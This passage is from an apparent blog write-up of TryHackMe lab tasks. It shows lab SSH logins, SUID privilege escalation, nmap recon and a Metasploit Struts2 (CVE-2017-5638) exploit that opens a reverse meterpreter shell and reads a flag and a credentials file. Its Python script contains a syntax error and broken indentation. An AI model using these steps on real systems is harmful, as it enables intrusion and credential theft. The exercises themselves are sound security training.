+</code></pre><p>Use <code>ssh</code> to login to machine as user <code>holly</code> and password <code>tuD@4vt0G*TU</code>. But the ssh service is not running on default port and could be got from <code>nmap</code> scan.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="ssh%20holly@%3Cip%3E%20-p%2065534" type="button"></button></div></div><pre><code>ssh holly@&lt;ip&gt; -p 65534
+</code></pre><p>If looked at location <code>/usr/bin</code> there would be a binary with <code>SUID</code> tag set with ownership of user <code>igor</code>. An output similar to below will be obtained. Use the <binary> to get the flag.</binary></p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="holly@%3Chostname%3E:~$%20ll%20%3Cbinary%3E%0A-rwsr-xr-x%201%20igor%20igor%20221768%20Feb%20%207%20%202016%20%3Cbinary%3E%0Aholly@%3Chostname%3E:~$%20find%20/home/igor%20-name%20flag1.txt%20-exec%20cat%20%7B%7D%20%5C;%0A%20%20%20%20%3Cflag%3E" type="button"></button></div></div><pre><code>holly@&lt;hostname&gt;:~$ ll &lt;binary&gt;
+-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 &lt;binary&gt;
+holly@&lt;hostname&gt;:~$ find /home/igor -name flag1.txt -exec cat {} \;
+    &lt;flag&gt;
+</code></pre><p>Use <code>find</code> to find executables which has <code>SUID</code> set as root user.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="find%20/%20-user%20root%20-perm%20-4000%202%3E/dev/null" type="button"></button></div></div><pre><code>find / -user root -perm -4000 2&gt;/dev/null
+</code></pre><p>There is a binary set with <code>SUID</code> for root. Trying to execute will allow users to run any command as root, and using the same the <code>flag</code> can be retrieved.</p><h2 id="task-14---day-9---requests">Task 14 - Day 9 - Requests</h2><p>This task is about getting <code>web</code> page contents programatically and stitching together the message from each web page.</p><h3 id="references-8">References</h3><ul><li><a href="https://docs.google.com/document/d/1FyAnxlQpzh0Cy17cKLsUZYCYqUA3eHu2hm0snilaPL0/edit?usp=sharing" target="_blank">TryHackMe supporting material</a></ul><p>When accessing the url <code>http://10.10.169.100:3000</code>, there is a response <code>{"value":"s","next":"f"}</code>. Accessing page with next value <code>http://10.10.169.100:3000/f</code> will give another string.</p><p>This can be done manually or programatically. An example script would be like below. Executing the script will give the <flag>.</flag></p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="import%20requests%0A%0Ainit_response%20=%20requests.get(%20'http://10.10.169.100:3000'%20)%0A%0Amessage%20=%20init_response.json()['value']%0Anxt%20=%20init_response.json()['next']%0A%0Awhile%20True:%0A%20%20%20%20response%20=%20requests.get(%20%22http://10.10.169.100:3000/%22%20+%20nxt%20)%0A%20%20%20%20if%20response.json()['value']%20=%20'end':%0A%20%20%20%20%20%20%20%20break%0A%0Amessage%20+=%20response.json()['value']%0Anxt%20=%20response.json()['next']%0A%0Aprint(message)" type="button"></button></div></div><pre><code>import requests
+
+init_response = requests.get( 'http://10.10.169.100:3000' )
+
+message = init_response.json()['value']
+nxt = init_response.json()['next']
+
+while True:
+    response = requests.get( "http://10.10.169.100:3000/" + nxt )
+    if response.json()['value'] = 'end':
+        break
+
+message += response.json()['value']
+nxt = response.json()['next']
+
+print(message)
+</code></pre><h2 id="task-15---day-10---metasploit-a-ho-ho-ho">Task 15 - Day 10 - Metasploit-a-ho-ho-ho</h2><p>This task is about using <code>nmap</code> to get web service information and using <code>metasploit</code> to exploit <code>apache struts 2</code> vulnerability.</p><h3 id="references-9">References</h3><ul><li><a href="https://blog.tryhackme.com/metasploit/" target="_blank">TryHackMe supporting material</a><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a></ul><p>Using <code>nmap</code>, perform basic recon and get listening ports.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-Pn%20-T4%20-sS%20-F%20--reason%20--open%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -Pn -T4 -sS -F --reason --open &lt;ip&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-01-23%2012:58%20GMT%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up,%20received%20arp-response%20(0.0011s%20latency).%0ANot%20shown:%2097%20closed%20ports%0AReason:%2097%20resets%0APORT%20%20%20%20STATE%20SERVICE%20REASON%0A22/tcp%20%20open%20%20ssh%20%20%20%20%20syn-ack%20ttl%20255%0A80/tcp%20%20open%20%20http%20%20%20%20syn-ack%20ttl%20254%0A111/tcp%20open%20%20rpcbind%20syn-ack%20ttl%20255%0AMAC%20Address:%2002:EA:AF:A4:E6:7D%20(Unknown)%0A%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%201.60%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-23 12:58 GMT
+Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
+Host is up, received arp-response (0.0011s latency).
+Not shown: 97 closed ports
+Reason: 97 resets
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 255
+80/tcp  open  http    syn-ack ttl 254
+111/tcp open  rpcbind syn-ack ttl 255
+MAC Address: 02:EA:AF:A4:E6:7D (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds
+</code></pre><p>Use <code>nmap</code> service scan on port <code>80</code> to find version of web server.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-Pn%20-p80%20-sV%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -Pn -p80 -sV &lt;ip&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-01-23%2012:59%20GMT%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up%20(0.00020s%20latency).%0A%0APORT%20%20%20STATE%20SERVICE%20VERSION%0A80/tcp%20open%20%20http%20%20%20%20Apache%20Tomcat/Coyote%20JSP%20engine%201.1%0AMAC%20Address:%2002:EA:AF:A4:E6:7D%20(Unknown)%0A%0AService%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%206.93%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-23 12:59 GMT
+Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
+Host is up (0.00020s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 02:EA:AF:A4:E6:7D (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
+</code></pre><p>Use <code>firefox</code> to check the url <code>http://&lt;ip&gt;</code>, and the resource <code>showcase.action</code> is available. This can be used to exploit <code>apache struts 2</code> using the <a href="https://www.exploit-db.com/exploits/41570" target="_blank">CVE-2017-5638</a>.</p><p>Use <code>msfconsole</code> to exploit <code>apache struts 2</code> web application.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20%3E%20search%20struts2%0A%0AMatching%20Modules%0A%0A#%20%20Name%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disclosure%20Date%20%20Rank%20%20%20%20%20%20%20Check%20%20Description%0A-%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20---------------%20%20----%20%20%20%20%20%20%20-----%20%20-----------%0A0%20%20exploit/multi/http/struts2_code_exec_showcase%20%20%20%202017-07-07%20%20%20%20%20%20%20excellent%20%20Yes%20%20%20%20Apache%20Struts%202%20Struts%201%20Plugin%20Showcase%20OGNL%20CodeExecution%0A1%20%20exploit/multi/http/struts2_content_type_ognl%20%20%20%20%202017-03-07%20%20%20%20%20%20%20excellent%20%20Yes%20%20%20%20Apache%20Struts%20Jakarta%20Multipart%20Parser%20OGNL%20Injection%0A2%20%20exploit/multi/http/struts2_namespace_ognl%20%20%20%20%20%20%20%202018-08-22%20%20%20%20%20%20%20excellent%20%20Yes%20%20%20%20Apache%20Struts%202%20Namespace%20Redirect%20OGNL%20Injection%0A3%20%20exploit/multi/http/struts2_rest_xstream%20%20%20%20%20%20%20%20%20%202017-09-05%20%20%20%20%20%20%20excellent%20%20Yes%20%20%20%20Apache%20Struts%202%20REST%20Plugin%20XStream%20RCE%0A4%20%20exploit/multi/http/struts_code_exec_classloader%20%202014-03-06%20%20%20%20%20%20%20manual%20%20%20%20%20No%20%20%20%20%20Apache%20Struts%20ClassLoader%20Manipulation%20Remote%20CodeExecution%0A5%20%20exploit/multi/http/struts_code_exec_parameters%20%20%202011-10-01%20%20%20%20%20%20%20excellent%20%20Yes%20%20%20%20Apache%20Struts%20ParametersInterceptor%20Remote%20CodeExecution%0A6%20%20exploit/multi/http/struts_dev_mode%20%20%20%20%20%20%20%20%20%20%20%20%20%20%202012-01-06%20%20%20%20%20%20%20excellent%20%20Yes%20%20%20%20Apache%20Struts%202%20Developer%20Mode%20OGNL%20Execution%0A%0Amsf5%20%3E%20use%20exploit/multi/http/struts2_content_type_ognl%0A[*]%20No%20payload%20configured,%20defaulting%20to%20linux/x64/meterpreter/reverse_tcp%0Amsf5%20exploit(multi/http/struts2_content_type_ognl)%20%3E%20show%20options%0A%0AModule%20options%20(exploit/multi/http/struts2_content_type_ognl):%0A%0AName%20%20%20%20%20%20%20Current%20Setting%20%20%20%20%20Required%20%20Description%0A----%20%20%20%20%20%20%20---------------%20%20%20%20%20--------%20%20-----------%0AProxies%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20A%20proxy%20chain%20of%20format%20type:host:port[,type:host:port][...]%0ARHOSTS%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20target%20host(s),%20range%20CIDR%20identifier,%20or%20hosts%20file%20with%20syntax%20'file:%3Cpath%3E'%0ARPORT%20%20%20%20%20%208080%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20target%20port%20(TCP)%0ASSL%20%20%20%20%20%20%20%20false%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20Negotiate%20SSL/TLS%20for%20outgoing%20connections%0ATARGETURI%20%20/struts2-showcase/%20%20yes%20%20%20%20%20%20%20The%20path%20to%20a%20struts%20application%20action%0AVHOST%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20HTTP%20server%20virtual%20host%0A%0APayload%20options%20(linux/x64/meterpreter/reverse_tcp):%0A%0AName%20%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20%20---------------%20%20--------%20%20-----------%0ALHOST%20%20%3Clocal-ip%3E%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20address%20(an%20interface%20may%20be%20specified)%0ALPORT%20%204444%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20port%0A%0AExploit%20target:%0A%0AId%20%20Name%0A--%20%20----%0A0%20%20%20Universal%0A%0Amsf5%20exploit(multi/http/struts2_content_type_ognl)%20%3E%20set%20RHOSTS%20%3Cip%3E%0ARHOSTS%20=%3E%20%3Cip%3E%0Amsf5%20exploit(multi/http/struts2_content_type_ognl)%20%3E%20set%20TARGETURI%20/showcase.action%0ATARGETURI%20=%3E%20/showcase.action%0Amsf5%20exploit(multi/http/struts2_content_type_ognl)%20%3E%20set%20RPORT%2080%0ARPORT%20=%3E%2080" type="button"></button></div></div><pre><code>msf5 &gt; search struts2
+
+Matching Modules
+
+#  Name                                             Disclosure Date  Rank       Check  Description
+-  ----                                             ---------------  ----       -----  -----------
+0  exploit/multi/http/struts2_code_exec_showcase    2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL CodeExecution
+1  exploit/multi/http/struts2_content_type_ognl     2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
+2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+3  exploit/multi/http/struts2_rest_xstream          2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
+4  exploit/multi/http/struts_code_exec_classloader  2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote CodeExecution
+5  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote CodeExecution
+6  exploit/multi/http/struts_dev_mode               2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+
+msf5 &gt; use exploit/multi/http/struts2_content_type_ognl
+[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/http/struts2_content_type_ognl) &gt; show options
+
+Module options (exploit/multi/http/struts2_content_type_ognl):
+
+Name       Current Setting     Required  Description
+----       ---------------     --------  -----------
+Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+RPORT      8080                yes       The target port (TCP)
+SSL        false               no        Negotiate SSL/TLS for outgoing connections
+TARGETURI  /struts2-showcase/  yes       The path to a struts application action
+VHOST                          no        HTTP server virtual host
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST  &lt;local-ip&gt;     yes       The listen address (an interface may be specified)
+LPORT  4444             yes       The listen port
+
+Exploit target:
+
+Id  Name
+--  ----
+0   Universal
+
+msf5 exploit(multi/http/struts2_content_type_ognl) &gt; set RHOSTS &lt;ip&gt;
+RHOSTS =&gt; &lt;ip&gt;
+msf5 exploit(multi/http/struts2_content_type_ognl) &gt; set TARGETURI /showcase.action
+TARGETURI =&gt; /showcase.action
+msf5 exploit(multi/http/struts2_content_type_ognl) &gt; set RPORT 80
+RPORT =&gt; 80
+</code></pre><p>Exploiting with the set options will gain a <code>shell</code>, where <code>flag</code> can be retrieved.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(multi/http/struts2_content_type_ognl)%20%3E%20exploit%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Clocal-ip%3E:4444%0A[*]%20Sending%20stage%20(3012516%20bytes)%20to%20%3Cip%3E%0A[*]%20Meterpreter%20session%201%20opened%20(%3Clocal-ip%3E:4444%20-%3E%20%3Cip%3E:57606)%20at%202021-01-23%2013:39:13%20+0000%0A%0Ameterpreter%20%3E%20shell%0AProcess%2058%20created.%0AChannel%201%20created.%0Ascript%20-qc%20/bin/bash%20/dev/null%0A%0Aroot@%3Chostname%3E:/usr/local/tomcat#%20find%20/%20-type%20f%20-iname%20*flag.txt*%0Afind%20/%20-type%20f%20-iname%20*flag*%0A%3Cflag-file%3E%0A%0Aroot@%3Chostname%3E:/usr/local/tomcat#%20cat%20%3Cflag-file%3E%0Acat%20%3Cflag-file%3E%0A%20%20%20%20%3Cflag%3E" type="button"></button></div></div><pre><code>msf5 exploit(multi/http/struts2_content_type_ognl) &gt; exploit
+
+[*] Started reverse TCP handler on &lt;local-ip&gt;:4444
+[*] Sending stage (3012516 bytes) to &lt;ip&gt;
+[*] Meterpreter session 1 opened (&lt;local-ip&gt;:4444 -&gt; &lt;ip&gt;:57606) at 2021-01-23 13:39:13 +0000
+
+meterpreter &gt; shell
+Process 58 created.
+Channel 1 created.
+script -qc /bin/bash /dev/null
+
+root@&lt;hostname&gt;:/usr/local/tomcat# find / -type f -iname *flag.txt*
+find / -type f -iname *flag*
+&lt;flag-file&gt;
+
+root@&lt;hostname&gt;:/usr/local/tomcat# cat &lt;flag-file&gt;
+cat &lt;flag-file&gt;
+    &lt;flag&gt;
+</code></pre><p>There is a file with <code>ssh</code> creds in santa’s home folder. The same can be retrieved from msf shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="root@%3Chostname%3E:/#%20cat%20/home/santa/%3Ccreds-file%3E%0Acat%20/home/santa/%3Ccreds-file%3E%0A%20%20%20%20santa:%3Cpassword%3E" type="button"></button></div></div><pre><code>root@&lt;hostname&gt;:/# cat /home/santa/&lt;creds-file&gt;
+cat /home/santa/&lt;creds-file&gt;
+    santa:&lt;password&gt;
+</code></pre><p>Use <code>ssh</code> to machine as <code>santa</code> user with <code>password</code> retrieved from <code>msfconsole</code> shell, to retrieve <code>file-contents</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[santa@%3Chostname%3E%20~]$%20ls%0Anaughty_list.txt%20%20nice_list.txt%0A%0A[santa@%3Chostname%3E%20~]$%20sed%20'148q;d'%20naughty_list.txt%0A%3Cuser%3E%0A%0A[santa@%3Chostname%3E%20~]$%20sed%20'52q;d'%20nice_list.txt%0A%3Cuser%3E" type="button"></button></div></div><pre><code>[santa@&lt;hostname&gt; ~]$ ls
+naughty_list.txt  nice_list.txt
+
+[santa@&lt;hostname&gt; ~]$ sed '148q;d' naughty_list.txt
+&lt;user&gt;
+
+[santa@&lt;hostname&gt; ~]$ sed '52q;d' nice_list.txt
+&lt;user&gt;
+</code></pre></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/network/" class="post-tag no-text-decoration" >network</a> <a href="/tags/protocols/" class="post-tag no-text-decoration" >protocols</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/database/" class="post-tag no-text-decoration" >database</a> <a href="/tags/binary/" class="post-tag no-text-decoration" >binary</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a> <a href="/tags/osint/" class="post-tag no-text-decoration" >osint</a> <a href="/tags/cloud/" class="post-tag no-text-decoration" >cloud</a> <a href="/tags/encryption/" class="post-tag no-text-decoration" >encryption</a></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-network-services/"><div class="card-body"> <span class="timeago small" > Dec 11, 2020 <i class="unloaded">2020-12-11T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Network Services</h3><div class="text-muted small"><p> Network Services This room contains info and methods to recon and enumerate SMB, Telnet and FTP For complete tryhackme path, refer the link SMB Task 2 - Understanding SMB References S...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-network-services-2/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Network Services 2</h3><div class="text-muted small"><p> Network Services This room contains info and methods to recon and enumerate SMB, Telnet and FTP For complete tryhackme path, refer the link NFS Task 2 - Understanding NFS References N...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-alfred/"><div class="card-body"> <span class="timeago small" > Mar 22 <i class="unloaded">2021-03-22T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Alfred</h3><div class="text-muted small"><p> Alfred This room contains detailed info about jenkins exploitation and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeration NMAP ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-linux-privesc/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Linux Privesc</p></a> <a href="/posts/tryhackme-advent-of-cyber-2/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Advent of Cyber 2</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/4n3i5v74">4n3i5v74</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/network/">network</a> <a class="post-tag" href="/tags/protocols/">protocols</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://4n3i5v74.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
